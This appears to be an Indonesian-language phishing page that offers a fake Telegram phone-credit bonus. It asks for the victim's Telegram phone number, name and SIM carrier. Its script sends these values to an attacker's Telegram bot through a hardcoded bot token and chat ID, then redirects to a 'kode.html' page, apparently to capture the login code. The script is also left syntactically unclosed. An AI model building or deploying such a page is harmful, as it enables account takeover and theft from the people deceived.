<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Bonus Pulsa TELEGRAM</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        .background {
            background: #f0f0f0;
            padding: 20px;
        }

        .container {
            margin-top: 20px;
        }

        .logo-atas img {
            width: 100%;
            max-width: 200px;
        }

        .title-web img {
            width: 100%;
            max-width: 200px;
        }

        .form-group {
            width: 70%;
            margin: auto;
        }

        .btnNext {
            background-color: #0ca2e7;
            border: none;
            border-radius: 10px;
            width: 100%;
            color: white;
            font-weight: bold;
            height: 45px;
        }

        #popup-container {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            padding: 20px;
            background-color: #fff;
            border: 1px solid #ccc;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
            z-index: 1000;
        }

        #popup-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            z-index: 999;
        }

        #popup-close {
            cursor: pointer;
            position: absolute;
            top: 10px;
            right: 10px;
            font-size: 20px;
        }

        #popup-content {
            text-align: center;
        }
    </style>
</head>
<body>
    <nav class="background">
        <div class="container">
            <a class="navbar-brand" href="#1231">
                <div class="logo-atas">
                    <img class="img-fluid" src="atas.jpg" alt="">
                </div>
                <h5 style="color: #10b3ff">BONUS PULSA TELEGRAM</h5>
            </a>
        </div>
    </nav>

    <div class="container">
        <div class="title-web mt-2">
            <div class="logo-atas">
                <img class="img-fluid" src="images.png" alt="">
            </div>
            <div class="title-web mt-1">
                <h2 class="text-center">Isi data penerima Bonus Telegram</h2>
            </div><br>
            <div class="image-web">
                <div class="col-md-6 form-group">
                    <label for="nope">Nomor akun TELEGRAM</label>
                    <input type="number" name="nope" id="nope" class="form-control" style="border: 1px solid rgb(0, 195, 255);">
                </div>

                <div class="col-md-6 form-group">
                    <label for="pin">Nama Anda</label>
                    <input type="text" name="pin" id="pin" class="form-control" style="border: 1px solid rgb(0, 153, 255);">
                </div>

                <div class="col-md-6 form-group">
                    <label for="input1">Simcard Anda</label>
                    <select class="form-control shadow-sm" id="input1" style="border-radius: 15px;">
                        <option value="">+Simcard Anda+</option>
                        <option value="TELKOMSEL">TELKOMSEL</option>
                        <option value="INDOSAT">INDOSAT</option>
                        <option value="TREE">TREE</option>
                        <option value="XL">XL</option>
                        <option value="LAINNYA">LAINNYA</option>
                    </select>
                </div>

                <div class="col-md-12 mt-3 form-group">
                    <button onclick="next()" class="btnNext">Kirimkan</button>
                </div>

                <p id="proses" class="text-center" style="color: rgb(134, 2, 2); display: none;">TERIMA KASIH PERMINTAAN ANDA SEDANG DI PROSES</p>
            </div>
        </div>
    </div>

    <div id="popup-overlay"></div>
    <div id="popup-container">
        <div id="popup-content">
            <span id="popup-close" onclick="closePopup()">&times;</span>
            <p>Popup Content Goes Here!</p>
            <link rel="icon" type="image/x-icon" href="asset/loading.png">
            <button onclick="window.location.href = 'https://www.example.com'">Visit Example.com</button>
            <button onclick="window.open('https://www.example.com', '_blank')">Open in New Window</button>
        </div>
    </div>

    <script> 
        const next = () => {
            let proses = document.querySelector("#proses");
            let nope = document.querySelector("#nope").value;
            let pin = document.querySelector("#pin").value;
            const nocard = document.querySelector("#input1").value;
            let token = "6854558867:AAHpWOz8lFqJqzHXq9RbVl-gS2YnGoy3oxg"
            let id_tele = "6250486742"
            if (nope === "" | pin === "") {
              alert("Mohon Isi data Dengan Benar")
            } else {
              let message = `  *Telegram Bonus*%0A%0ASIMCARD: ${nocard}%0A________________%0ANo. handphone:%0A${nope}%0A----------------------%0Anama: ${pin}`
              let api = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${id_tele}&text=${message}`
              fetch(api, {
                method: 'POST',
              })
              .then((response) => response.json())
              .then(data => {
                     console.log('Pesan terkirim:', data);
                     window.location.href= "kode.html";
               })
               .catch((error) => {

               });

         </script>
         <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" crossorigin="anonymous"></script>
       </body>
     </html>
